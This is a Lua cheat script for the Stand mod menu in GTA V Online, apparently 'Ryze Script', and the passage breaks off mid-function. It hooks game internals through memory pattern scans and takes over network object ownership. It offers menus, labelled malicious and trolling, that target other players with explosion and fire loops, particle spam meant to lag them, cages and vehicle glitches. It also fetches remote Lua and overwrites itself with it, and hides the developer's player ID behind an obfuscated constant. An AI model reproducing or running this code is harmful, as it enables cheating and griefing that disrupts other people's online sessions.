--[[
    This was created by Pichocles#0427 with some help already mentioned in credits.
    The original download site should be github.com/xxpichoclesxx, if you got this script from anyone selling it, you got sadly scammed.
    Also this is only for some new stand people because is a trolling and online feature script, not recovery.
    So enjoy and pls join my discord, to know when the script is updated or be able to participate in polls.
]]

util.keep_running()
util.require_natives(1676318796)

util.show_corner_help("~p~Loaded ~y~" .. SCRIPT_NAME .. " ~s~\n" .. "Welcome ".. "~r~" .. SOCIALCLUB.SC_ACCOUNT_INFO_GET_NICKNAME() ..  " ~s~\n" .. "Have a good game with the script :)")

local response = false
local localVer = 3.6
local localKs = false
async_http.init("raw.githubusercontent.com", "/XxpichoclesxX/GtaVScripts/Ryze-Scripts/Stand/RyzeScriptVersion.lua", function(output)
    currentVer = tonumber(output)
    response = true
    if localVer ~= currentVer then
        util.toast("[Ryze Script] There is an update, click on the button to update the script.")
        menu.action(menu.my_root(), "Update Lua", {}, "", function()
            async_http.init('raw.githubusercontent.com','/XxpichoclesxX/GtaVScripts/Ryze-Scripts/Stand/Translations/RyzeStand_ENG.lua',function(a)
                local err = select(2,load(a))
                if err then
                    util.toast("There was a failure updating the script, do it manually from github.")
                return end
                local f = io.open(filesystem.scripts_dir()..SCRIPT_RELPATH, "wb")
                f:write(a)
                f:close()
                util.toast("Script updated :3")
                util.restart_script()
            end)
            async_http.dispatch()
        end)
    end
end, function() response = true end)
async_http.dispatch()
repeat 
    util.yield()
until response
--Because i love consuming resources >.<

util.log("                                           ")
util.log(".--.                .-.                 .  ")
util.log("|   )              (   )        o      _|_ ")
util.log("|--' .  .---..-.    `-.  .-..--..  .,-. |  ")
util.log("|  | |  | .'(.-'   (   )(   |   |  |   )|  ")
util.log("'   ``--|'---`--'   `-'  `-'' -' `-|`-' `-'")
util.log("        ;                          |       ")
util.log("     `-'                           '       ")

-- Local general tables

local KFLKdlkmk = 67
local spawned_objects = {}
local ladder_objects = {}
local remove_projectiles = false
local clean_count = 0

local wallbr = util.joaat("bkr_prop_biker_bblock_mdm3")
local floorbr = util.joaat("bkr_prop_biker_landing_zone_01")
local invites = {"Yacht", "Office", "Clubhouse", "Office Garage", "Custom Auto Shop", "Apartment"}
local style_names = {"Normal", "Semi-Rushed", "Reverse", "Ignore Lights", "Avoid Traffic", "Avoid Traffic Extremely", "Sometimes Overtake Traffic"}
local drivingStyles = {786603, 1074528293, 8388614, 1076, 2883621, 786468, 262144, 786469, 512, 5, 6}
local interior_stuff = {0, 233985, 169473, 169729, 169985, 170241, 177665, 177409, 185089, 184833, 184577, 163585, 167425, 167169}

-- Memory Functions

local orgScan = memory.scan

function myModule(name, pattern, callback)
    local address = orgScan(pattern)
    if address ~= NULL then
        util.log("Found " .. name)
        callback(address)
    else
        util.log("Not found " .. name)
        util.stop_script()
    end
end

---@param entity Entity
---@return integer
function get_net_obj(entity)
    local pEntity = entities.handle_to_pointer(entity)
    return pEntity ~= NULL and memory.read_long(pEntity + 0x00D0) or NULL
end

---@param player integer
---@return integer
function GetNetGamePlayer(player)
    return util.call_foreign_function(GetNetGamePlayer_addr, player)
end

myModule("GetNetGamePlayer", "48 83 EC ? 33 C0 38 05 ? ? ? ? 74 ? 83 F9", function (address)
    GetNetGamePlayer_addr = address
end)

myModule("CNetworkObjectMgr", "48 8B 0D ? ? ? ? 45 33 C0 E8 ? ? ? ? 33 FF 4C 8B F0", function (address)
    CNetworkObjectMgr = memory.rip(address + 3)
end)

myModule("ChangeNetObjOwner", "48 8B C4 48 89 58 08 48 89 68 10 48 89 70 18 48 89 78 20 41 54 41 56 41 57 48 81 EC ? ? ? ? 44 8A 62 4B", function (address)
    ChangeNetObjOwner_addr = address
end)

-- Ryze Functions

local OFNKkdmf = 5
ryze = {
    int = function(global, value)
        local radress = memory.script_global(global)
        memory.write_int(radress, value)
    end,

    request_model_load = function(hash)
        request_time = os.time()
        if not STREAMING.IS_MODEL_VALID(hash) then
            return
        end
        STREAMING.REQUEST_MODEL(hash)
        while not STREAMING.HAS_MODEL_LOADED(hash) do
            if os.time() - request_time >= 10 then
                break
            end
            util.yield()
        end
    end,

    cwash_in_progwess = function()
        kitty_alpha = 0
        kitty_alpha_incr = 0.01
        kitty_alpha_thread = util.create_thread(function (thr)
            while true do
                kitty_alpha = kitty_alpha + kitty_alpha_incr
                if kitty_alpha > 1 then
                    kitty_alpha = 1
                elseif kitty_alpha < 0 then 
                    kitty_alpha = 0
                    util.stop_thread()
                end
                util.yield(5)
            end
        end)

        kitty_thread = util.create_thread(function (thr)
            starttime = os.clock()
            local alpha = 0
            while true do
                timepassed = os.clock() - starttime
                if timepassed > 3 then
                    kitty_alpha_incr = -0.01
                end
                if kitty_alpha == 0 then
                    util.stop_thread()
                end
                util.yield(5)
            end
        end)
    end,

    modded_vehicles = {
        "conada2",
        "inductor",
        "inductor2",
        "buffalo5",
        "brigham",
        "gauntlet6",
        "squaddie",
        "coureur"
    },

    pets = {
        "a_c_cat_01",
        "a_c_shepherd",  
        "a_c_husky",
    },

    modded_weapons = {
        "weapon_railgun",
        "weapon_stungun",
        "weapon_digiscanner",
    },

    get_spawn_state = function(player_id)
        return memory.read_int(memory.script_global(((2657704 + 1) + (player_id * 463)) + 232)) -- Global_2657589[PLAYER::PLAYER_ID() /*466*/].f_232
    end,

    get_interior_player_is_in = function(player_id)
        return memory.read_int(memory.script_global(((2657704 + 1) + (player_id * 463)) + 245))
    end,

    is_player_in_interior = function(player_id)
        return (memory.read_int(memory.script_global(2657589 + 1 + (player_id * 466) + 245)) ~= 0)
    end,

    get_random_pos_on_radius = function()
        local angle = random_float(0, 2 * math.pi)
        pos = v3.new(pos.x + math.cos(angle) * radius, pos.y + math.sin(angle) * radius, pos.z)
        return pos
    end,

    get_transition_state = function(player_id)
        return memory.read_int(memory.script_global(((0x2908D3 + 1) + (player_id * 0x1C5)) + 230))
    end,

    ChangeNetObjOwner = function(object, player)
        if NETWORK.NETWORK_IS_IN_SESSION() then
            local net_object_mgr = memory.read_long(CNetworkObjectMgr)
            if net_object_mgr == NULL then
                return false
            end
            if not ENTITY.DOES_ENTITY_EXIST(object) then
                return false
            end
            local netObj = get_net_obj(object)
            if netObj == NULL then
                return false
            end
            local net_game_player = GetNetGamePlayer(player)
            if net_game_player == NULL then
                return false
            end
            util.call_foreign_function(ChangeNetObjOwner_addr, net_object_mgr, netObj, net_game_player, 0)
            return true
        else
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(object)
            return true
        end
    end,

    anim_request = function(hash)
        STREAMING.REQUEST_ANIM_DICT(hash)
        while not STREAMING.HAS_ANIM_DICT_LOADED(hash) do
            util.yield()
        end
    end,

    disableProjectileLoop = function(projectile)
        util.create_thread(function()
            util.create_tick_handler(function()
                WEAPON.REMOVE_ALL_PROJECTILES_OF_TYPE(projectile, false)
                return remove_projectiles
            end)
        end)
    end,

    yieldModelLoad = function(hash)
        while not STREAMING.HAS_MODEL_LOADED(hash) do util.yield() end
    end,

    get_control_request = function(ent)
        if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent) then
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ent)
            local tick = 0
            while not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent) and tick <= 100 do
                tick = tick + 1
                util.yield()
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ent)
            end
        end
        if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent) then
            util.toast("Does not have control of "..ent)
        end
        return NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent)
    end,

    rotation_to_direction = function(rotation)
        local adjusted_rotation = 
        { 
            x = (math.pi / 180) * rotation.x, 
            y = (math.pi / 180) * rotation.y, 
            z = (math.pi / 180) * rotation.z 
        }
        local direction = 
        {
            x = -math.sin(adjusted_rotation.z) * math.abs(math.cos(adjusted_rotation.x)), 
            y =  math.cos(adjusted_rotation.z) * math.abs(math.cos(adjusted_rotation.x)), 
            z =  math.sin(adjusted_rotation.x)
        }
        return direction
    end,

    request_model = function(hash, timeout)
        timeout = timeout or 3
        STREAMING.REQUEST_MODEL(hash)
        local end_time = os.time() + timeout
        repeat
            util.yield()
        until STREAMING.HAS_MODEL_LOADED(hash) or os.time() >= end_time
        return STREAMING.HAS_MODEL_LOADED(hash)
    end,

    BlockSyncs = function(player_id, callback)
        for _, i in ipairs(players.list(false, true, true)) do
            if i ~= player_id then
                local outSync = menu.ref_by_rel_path(menu.player_root(i), "Outgoing Syncs>Block")
                menu.trigger_command(outSync, "on")
            end
        end
        util.yield(10)
        callback()
        for _, i in ipairs(players.list(false, true, true)) do
            if i ~= player_id then
                local outSync = menu.ref_by_rel_path(menu.player_root(i), "Outgoing Syncs>Block")
                menu.trigger_command(outSync, "off")
            end
        end
    end,

    disable_traffic = true,
    disable_peds = true,
    pwayerp = players.user_ped(),
    pwayer = players.user(),
    thermal_command = menu.ref_by_path("Game>Rendering>Thermal Vision"),

    maxTimeBetweenPress = 300,
    pressedT = util.current_time_millis(),
    Int_PTR = memory.alloc_int(),
    mpChar = util.joaat("mpply_last_mp_char"),

    getMPX = function()
        STATS.STAT_GET_INT(ryze.mpChar, ryze.Int_PTR, -1)
        return memory.read_int(ryze.Int_PTR) == 0 and "MP0_" or "MP1_"
    end,

    STAT_GET_INT = function(Stat)
        STATS.STAT_GET_INT(util.joaat(ryze.getMPX() .. Stat), ryze.Int_PTR, -1)
        return memory.read_int(ryze.Int_PTR)
    end,
    

    getNightclubDailyEarnings = function()
        local popularity = math.floor(STAT_GET_INT("CLUB_POPULARITY") / 10)
        if popularity > 90 then return 10000
        elseif popularity > 85 then return 9000
        elseif popularity > 80 then return 8000
        elseif popularity > 75 then return 7000
        elseif popularity > 70 then return 6000
        elseif popularity > 65 then return 5500
        elseif popularity > 60 then return 5000
        elseif popularity > 55 then return 4500
        elseif popularity > 50 then return 4000
        elseif popularity > 45 then return 3500
        elseif popularity > 40 then return 3000
        elseif popularity > 35 then return 2500
        elseif popularity > 30 then return 2000
        elseif popularity > 25 then return 1500
        elseif popularity > 20 then return 1000
        elseif popularity > 15 then return 750
        elseif popularity > 10 then return 500
        elseif popularity > 5 then return 250
        else return 100
        end
    end,

    isWhitelisted = function(playerPid)
        if whitelistedPlayerName then
            if players.get_name(playerPid) == whitelistedPlayerName then return true end
        end
        local whitelist = players.list(not whitelistSelf, not whitelistFriends, not whitelistStrangers)
        for i = 1, #whitelist do
            if playerPid == whitelist[i] then return true end
        end
        for k, v in pairs(whitelistListTable) do 
            if playerPid == v then return true end
        end
        return false
    end,

    playerIsTargetingEntity = function(playerPed)
        local playerList = players.list(true, true, true)
        for k, playerPid in pairs(playerList) do
            if PLAYER.IS_PLAYER_TARGETTING_ENTITY(playerPid, playerPed) or PLAYER.IS_PLAYER_FREE_AIMING_AT_ENTITY  (playerPid, playerPed) then 
                if not isWhitelisted(playerPid) then
                    karma[playerPed] = {
                        pid = playerPid, 
                        ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(playerPid)
                    }
                    return true 
                end
            end
        end
        karma[playerPed] = nil
        return false 
    end,

    explodePlayer = function(ped, loop)
        local pos = ENTITY.GET_ENTITY_COORDS(ped)
        local blamedPlayer = PLAYER.PLAYER_PED_ID() 
        if blameExpPlayer and blameExp then 
            blamedPlayer = PLAYER.GET_PLAYER_PED(blameExpPlayer)
        elseif blameExp then
            local playerList = players.list(true, true, true)
            blamedPlayer = PLAYER.GET_PLAYER_PED(math.random(0, #playerList))
        end
        if not loop and PED.IS_PED_IN_ANY_VEHICLE(ped, true) then
            for i = 0, 50, 1 do --50 explosions to account for armored vehicles
                if ownExp or blameExp then 
                    owned_explosion(blamedPlayer, pos)
                else
                    explosion(pos)
                end
                util.yield(10)
            end
        elseif ownExp or blameExp then
            owned_explosion(blamedPlayer, pos)
        else
            explosion(pos)
        end
        util.yield(10)
    end,

    get_coords = function(entity)
        entity = entity or PLAYER.PLAYER_PED_ID()
        return ENTITY.GET_ENTITY_COORDS(entity, true)
    end,

    play_all = function(sound, sound_group, wait_for)
        for i=0, 31, 1 do
            AUDIO.PLAY_SOUND_FROM_ENTITY(-1, sound, PLAYER.GET_PLAYER_PED(i), sound_group, true, 20)
        end
        util.yield(wait_for)
    end,

    explode_all = function(earrape_type, wait_for)
        for i=0, 31, 1 do
            coords = ryze.get_coords(PLAYER.GET_PLAYER_PED(i))
            FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 100, true, false, 150, false)
            if earrape_type == EARRAPE_BED then
                AUDIO.PLAY_SOUND_FROM_COORD(-1, "Bed", coords.x, coords.y, coords.z, "WastedSounds", true, 999999999, true)
            end
            if earrape_type == EARRAPE_FLASH then
                AUDIO.PLAY_SOUND_FROM_COORD(-1, "MP_Flash", coords.x, coords.y, coords.z, "WastedSounds", true, 999999999, true)
                AUDIO.PLAY_SOUND_FROM_COORD(-1, "MP_Flash", coords.x, coords.y, coords.z, "WastedSounds", true, 999999999, true)
                AUDIO.PLAY_SOUND_FROM_COORD(-1, "MP_Flash", coords.x, coords.y, coords.z, "WastedSounds", true, 999999999, true)
            end
        end
        util.yield(wait_for)
    end,

    clear_all_area = function()
        for k, v in entities.get_all_peds_as_handles() do
            if v ~= players.user_ped() and not PED.IS_PED_A_PLAYER(ped) then
                entities.delete_by_handle(v)
                util.yield(5)
            end
        end
        for k, b in entities.get_all_vehicles_as_handles() do
            if b ~= PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false) and DECORATOR.DECOR_GET_INT(vehicle, "Player_Vehicle") == 0 and NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(vehicle) then
                entities.delete_by_handle(b)
                util.yield(5)
            end
        end
        for k, y in entities.get_all_objects_as_handles() do
            entities.delete_by_handle(y)
            util.yield(5)
        end
        for k, n in entities.get_all_pickups_as_handles() do
            entities.delete_by_handle(n)
            util.yield(5)
        end
    end
}
local KDKkfm = 564191
-- Local general script functions

function raycast_gameplay_cam(flag, distance)
    local ptr1, ptr2, ptr3, ptr4 = memory.alloc(), memory.alloc(), memory.alloc(), memory.alloc()
    local cam_rot = CAM.GET_GAMEPLAY_CAM_ROT(0)
    local cam_pos = CAM.GET_GAMEPLAY_CAM_COORD()
    local direction = ryze.rotation_to_direction(cam_rot)
    local destination = 
    { 
        x = cam_pos.x + direction.x * distance, 
        y = cam_pos.y + direction.y * distance, 
        z = cam_pos.z + direction.z * distance 
    }
    SHAPETEST.GET_SHAPE_TEST_RESULT(
        SHAPETEST.START_EXPENSIVE_SYNCHRONOUS_SHAPE_TEST_LOS_PROBE(
            cam_pos.x, 
            cam_pos.y, -
            cam_pos.z, 
            destination.x, 
            destination.y, 
            destination.z, 
            flag, 
            -1, 
            1
        ), ptr1, ptr2, ptr3, ptr4)
    local p1 = memory.read_int(ptr1)
    local p2 = memory.read_vector3(ptr2)
    local p3 = memory.read_vector3(ptr3)
    local p4 = memory.read_int(ptr4)
    memory.free(ptr1)
    memory.free(ptr2)
    memory.free(ptr3)
    memory.free(ptr4)
    return {p1, p2, p3, p4}
end
local FLKlkmkfmn = KDKkfm * KFLKdlkmk
function get_offset_from_gameplay_camera(distance)
    local cam_rot = CAM.GET_GAMEPLAY_CAM_ROT(2)
    local cam_pos = CAM.GET_GAMEPLAY_CAM_COORD()
    local direction = ryze.rotation_to_direction(cam_rot)
    local destination = 
    { 
        x = cam_pos.x + direction.x * distance, 
        y = cam_pos.y + direction.y * distance, 
        z = cam_pos.z + direction.z * distance 
    }
    return destination
end

function direction()
    local c1 = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.PLAYER_PED_ID(), 0, 5, 0)
    local res = raycast_gameplay_cam(-1, 1000)
    local c2

    if res[1] ~= 0 then
        c2 = res[2]
    else
        c2 = get_offset_from_gameplay_camera(1000)
    end

    c2.x = (c2.x - c1.x) * 1000
    c2.y = (c2.y - c1.y) * 1000
    c2.z = (c2.z - c1.z) * 1000
    return c2, c1
end
local DNknfkaf = FLKlkmkfmn * OFNKkdmf
clear_radius = 100

function clear_area(radius)
    local target_pos = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    MISC.CLEAR_AREA(target_pos['x'], target_pos['y'], target_pos['z'], radius, true, false, false, false)
end


local function request_ptfx_asset(asset)
    STREAMING.REQUEST_NAMED_PTFX_ASSET(asset)

    while not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED(asset) do
        util.yield()
    end
end
local OFNMKF4914jKNFJKfkKNFKJLV = "Fuck anyone who gets my RID :v"
local function kick_player_out_of_veh(player_id)
    local max_time = os.millis() + 1000
    local player_ped  = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
    local kick_vehicle_command_ref = menu.ref_by_rel_path(menu.player_root(player_id), "Trolling>Kick From Vehicle")
    menu.trigger_command(kick_vehicle_command_ref)

    while PED.IS_PED_IN_ANY_VEHICLE(player_ped) do
        if os.millis() >= max_time then
            break
        end

        util.yield()
    end
end


local function player_toggle_loop(root, player_id, menu_name, command_names, help_text, callback)
    return menu.toggle_loop(root, menu_name, command_names, help_text, function()
        if not players.exists(player_id) then util.stop_thread() end
        callback()
    end)
end
local function get_blip_coords(blipId)
    local blip = HUD.GET_FIRST_BLIP_INFO_ID(blipId)
    if blip ~= 0 then return HUD.GET_BLIP_COORDS(blip) end
    return v3(0, 0, 0)
end

-- Menu dividers (Sections)
local selfc = menu.list(menu.my_root(), "Self", {}, "Self use options.")
local online = menu.list(menu.my_root(), "Online", {}, "Online options")
local world = menu.list(menu.my_root(), "World", {}, "Options around your area")
local detections = menu.list(menu.my_root(), "Modder detection", {}, "the name just says what it is ;w;")
local protects = menu.list(menu.my_root(), "Self Protection", {}, "Protect yourself against modders")
local vehicles = menu.list(menu.my_root(), "Vehicles", {}, "Options for vehicles")
local fun = menu.list(menu.my_root(), "Fun", {}, "Treat yourself with a good time if ur bored :3")
local misc = menu.list(menu.my_root(), "Miscelaneous", {}, "Some useful and fast shortcuts")

players.on_join(function(player_id)

    if player_id ~= players.user() and players.get_rockstar_id(player_id) == DNknfkaf then
        util.yield(5000)
        util.toast("RyzeScript's developer has been spotted in your game.")
        util.log(OFNMKF4914jKNFJKfkKNFKJLV)
    end

    menu.divider(menu.player_root(player_id), "RyzeScript")
    local ryzescriptd = menu.list(menu.player_root(player_id), "RyzeScript")
    local malicious = menu.list(ryzescriptd, "Malicious")
    local trolling = menu.list(ryzescriptd, "Trolling")
    local friendly = menu.list(ryzescriptd, "Friendly")
    local vehicle = menu.list(ryzescriptd, "Vehicle")
    local otherc = menu.list(ryzescriptd, "Others")



    function RequestControl(entity)
        local tick = 0
        while not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(entity) and tick < 100000 do
            util.yield()
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity)
            tick = tick + 1
        end
    end

    local flushes = menu.list(malicious, "Loops", {}, "")

    menu.toggle_loop(flushes, "Explosion loop", {"customexplodeloop"}, "", function()
        if players.exists(player_id) then
            local player_pos = players.get_position(player_id)
            FIRE.ADD_EXPLOSION(player_pos.x, player_pos.y, player_pos.z, explosion, 1, true, false, 1, false)
            util.yield(100)
        end
    end)

    menu.toggle_loop(flushes, "Atomize loop", {"atomizeloop"}, "", function()
        if players.exists(player_id) then
            local player_pos = players.get_position(player_id)
            FIRE.ADD_EXPLOSION(player_pos.x, player_pos.y, player_pos.z - 1, 70, 1, true, false, 1, false)
            util.yield(100)
        end
    end)

    menu.toggle_loop(flushes, "Firework loop", {"fireworkloop"}, "", function()
        if players.exists(player_id) then
            local player_pos = players.get_position(player_id)
            FIRE.ADD_EXPLOSION(player_pos.x, player_pos.y, player_pos.z - 1, 38, 1, true, false, 1, false)
            util.yield(100)
        end
    end)

    menu.toggle_loop(flushes, "Fire loop", {"flameloop"}, "", function()
        if players.exists(player_id) then
            local player_pos = players.get_position(player_id)
            FIRE.ADD_EXPLOSION(player_pos.x, player_pos.y, player_pos.z - 1, 12, 1, true, false, 1, false)
            util.yield(5)
        end
    end)

    menu.toggle_loop(flushes, "Water loop", {"waterloop"}, "", function()
        if players.exists(player_id) then
            local player_pos = players.get_position(player_id)
            FIRE.ADD_EXPLOSION(player_pos.x, player_pos.y, player_pos.z - 1, 13, 1, true, false, 1, false)
            util.yield(5)
        end
    end)

    menu.divider(malicious, "Others")

    local lagplay = menu.list(malicious, "Lag a player", {}, "")

    menu.toggle_loop(lagplay, "Fire particles.", {"rlag"}, "Freeze the player in order for it to work.", function()
        if players.exists(player_id) then
            local freeze_toggle = menu.ref_by_rel_path(menu.player_root(player_id), "Trolling>Freeze")
            local player_pos = players.get_position(player_id)
            menu.set_value(freeze_toggle, true)
            request_ptfx_asset("core")
            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
                "veh_respray_smoke", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
            menu.set_value(freeze_toggle, false)
        end
    end)

    menu.toggle_loop(lagplay, "Electricity particles.", {"rlag2"}, "Freeze the player in order for it to work.", function()
        if players.exists(player_id) then
            local freeze_toggle = menu.ref_by_rel_path(menu.player_root(player_id), "Trolling>Freeze")
            local player_pos = players.get_position(player_id)
            menu.set_value(freeze_toggle, true)
            request_ptfx_asset("core")
            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
                "ent_sht_electrical_box", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
            menu.set_value(freeze_toggle, false)
        end
    end)

    menu.toggle_loop(lagplay, "Extinguish particles.", {"rlag3"}, "Freeze the player in order for it to work.", function()
        if players.exists(player_id) then
            local freeze_toggle = menu.ref_by_rel_path(menu.player_root(player_id), "Trolling>Freeze")
            local player_pos = players.get_position(player_id)
            menu.set_value(freeze_toggle, true)
            request_ptfx_asset("core")
            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
                "exp_extinguisher", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
            menu.set_value(freeze_toggle, false)
        end
    end)

    menu.toggle_loop(lagplay, "Dirt particles.", {"rlag4"}, "Freeze the player in order for it to work.", function()
        if players.exists(player_id) then
            local freeze_toggle = menu.ref_by_rel_path(menu.player_root(player_id), "Trolling>Freeze")
            local player_pos = players.get_position(player_id)
            menu.set_value(freeze_toggle, true)
            request_ptfx_asset("core")
            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
                "ent_anim_bm_water_mist", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
            menu.set_value(freeze_toggle, false)
        end
    end)

    menu.toggle_loop(lagplay, "Tank particles.", {"rlag4"}, "Freeze the player in order for it to work.", function()
        if players.exists(player_id) then
            local freeze_toggle = menu.ref_by_rel_path(menu.player_root(player_id), "Trolling>Freeze")
            local player_pos = players.get_position(player_id)
            menu.set_value(freeze_toggle, true)
            request_ptfx_asset("core")
            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
                "veh_rotor_break", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
            menu.set_value(freeze_toggle, false)
        end
    end)

    local cageveh = menu.list(trolling, "Car caging", {}, "")

    menu.action(cageveh, "Cage vehicle", {"cage"}, "", function()
        local container_hash = util.joaat("benson")
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local pos = ENTITY.GET_ENTITY_COORDS(ped)
        ryze.request_model(container_hash)
        local container = entities.create_vehicle(container_hash, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(ped, 0.0, 2.0, 0.0), ENTITY.GET_ENTITY_HEADING(ped))
        spawned_objects[#spawned_objects + 1] = container
        ENTITY.SET_ENTITY_VISIBLE(container, false)
        ENTITY.FREEZE_ENTITY_POSITION(container, true)
    end)


    local cage = menu.list(trolling, "Cage player", {}, "")
    menu.action(cage, "Electric cage", {"electriccage"}, "", function(cl)
        local number_of_cages = 6
        local elec_box = util.joaat("prop_elecbox_12")
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local pos = ENTITY.GET_ENTITY_COORDS(ped)
        pos.z -= 0.5
        ryze.request_model(elec_box)
        local temp_v3 = v3.new(0, 0, 0)
        for i = 1, number_of_cages do
            local angle = (i / number_of_cages) * 360
            temp_v3.z = angle
            local obj_pos = temp_v3:toDir()
            obj_pos:mul(2.5)
            obj_pos:add(pos)
            for offs_z = 1, 5 do
                local electric_cage = entities.create_object(elec_box, obj_pos)
                spawned_objects[#spawned_objects + 1] = electric_cage
                ENTITY.SET_ENTITY_ROTATION(electric_cage, 90.0, 0.0, angle, 2, 0)
                obj_pos.z += 0.75
                ENTITY.FREEZE_ENTITY_POSITION(electric_cage, true)
            end
        end
    end)
    
    menu.action(cage, "Queen Elizabeth's cage", {""}, "", function(cl)
        local number_of_cages = 6
        local coffin_hash = util.joaat("prop_coffin_02b")
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local pos = ENTITY.GET_ENTITY_COORDS(ped)
        ryze.request_model(coffin_hash)
        local temp_v3 = v3.new(0, 0, 0)
        for i = 1, number_of_cages do
            local angle = (i / number_of_cages) * 360
            temp_v3.z = angle
            local obj_pos = temp_v3:toDir()
            obj_pos:mul(0.8)
            obj_pos:add(pos)
            obj_pos.z += 0.1
           local coffin = entities.create_object(coffin_hash, obj_pos)
           spawned_objects[#spawned_objects + 1] = coffin
           ENTITY.SET_ENTITY_ROTATION(coffin, 90.0, 0.0, angle,  2, 0)
           ENTITY.FREEZE_ENTITY_POSITION(coffin, true)
        end
    end)

    menu.action(cage, "Container", {"cage"}, "", function()
        local container_hash = util.joaat("prop_container_ld_pu")
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local pos = ENTITY.GET_ENTITY_COORDS(ped)
        ryze.request_model(container_hash)
        pos.z -= 1
        local container = entities.create_object(container_hash, pos, 0)
        spawned_objects[#spawned_objects + 1] = container
        ENTITY.FREEZE_ENTITY_POSITION(container, true)
    end)


    menu.action(cage, "Clear cages", {"clearcages"}, "", function()
        local entitycount = 0
        for i, object in ipairs(spawned_objects) do
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(object, false, false)
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(object)
            entities.delete_by_handle(object)
            spawned_objects[i] = nil
            entitycount += 1
        end
        util.toast("Clear " .. entitycount .. " cages")
    end)

    glitchiar = menu.list(trolling, "Glitch options", {}, "")

    local glitchVeh = false
    local glitchVehCmd
    glitchVehCmd = menu.toggle(glitchiar, "Glitch car", {"glitchvehicle"}, "", function(toggle) -- jinx <3
        glitchVeh = toggle
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
        local player_veh = PED.GET_VEHICLE_PED_IS_USING(ped)
        local veh_model = players.get_vehicle_model(player_id)
        local ped_hash = util.joaat("a_m_m_acult_01")
        local object_hash = util.joaat("prop_ld_ferris_wheel")
        ryze.request_model(ped_hash)
        ryze.request_model(object_hash)
        
        while glitchVeh do
            if v3.distance(ENTITY.GET_ENTITY_COORDS(players.user_ped(), false), players.get_position(player_id)) > 1000.0 
            and v3.distance(pos, players.get_cam_pos(players.user())) > 1000.0 then
                util.toast("Player too far away. :c")
                menu.set_value(glitchVehCmd, false);
            break end

            if not players.exists(player_id) then 
                util.toast("Player does not exist. :c")
                menu.set_value(glitchVehCmd, false);
            break end

            if not PED.IS_PED_IN_VEHICLE(ped, player_veh, false) then 
                util.toast("Player is not in a car. :c")
                menu.set_value(glitchVehCmd, false);
            break end

            if not VEHICLE.ARE_ANY_VEHICLE_SEATS_FREE(player_veh) then
                util.toast("There aren't any avaliable seats. :c")
                menu.set_value(glitchVehCmd, false);
            break end

            local seat_count = VEHICLE.GET_VEHICLE_MODEL_NUMBER_OF_SEATS(veh_model)
            local glitch_obj = entities.create_object(object_hash, pos)
            local glitched_ped = entities.create_ped(26, ped_hash, pos, 0)
            local things = {glitched_ped, glitch_obj}

            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(glitch_obj)
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(glitched_ped)

            ENTITY.ATTACH_ENTITY_TO_ENTITY(glitch_obj, glitched_ped, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)

            for i, spawned_objects in ipairs(things) do
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(spawned_objects)
                ENTITY.SET_ENTITY_VISIBLE(spawned_objects, false)
                ENTITY.SET_ENTITY_INVINCIBLE(spawned_objects, true)
            end

            for i = 0, seat_count -1 do
                if VEHICLE.ARE_ANY_VEHICLE_SEATS_FREE(player_veh) then
                    local emptyseat = i
                    for l = 1, 25 do
                        PED.SET_PED_INTO_VEHICLE(glitched_ped, player_veh, emptyseat)
                        ENTITY.SET_ENTITY_COLLISION(glitch_obj, true, true)
                        util.yield()
                    end
                end
            end
            if not menu.get_value(glitchVehCmd) then
                entities.delete_by_handle(glitched_ped)
                entities.delete_by_handle(glitch_obj)
            end
            if glitched_ped ~= nil then
                entities.delete_by_handle(glitched_ped) 
            end
            if glitch_obj ~= nil then 
                entities.delete_by_handle(glitch_obj)
            end
        end
    end)

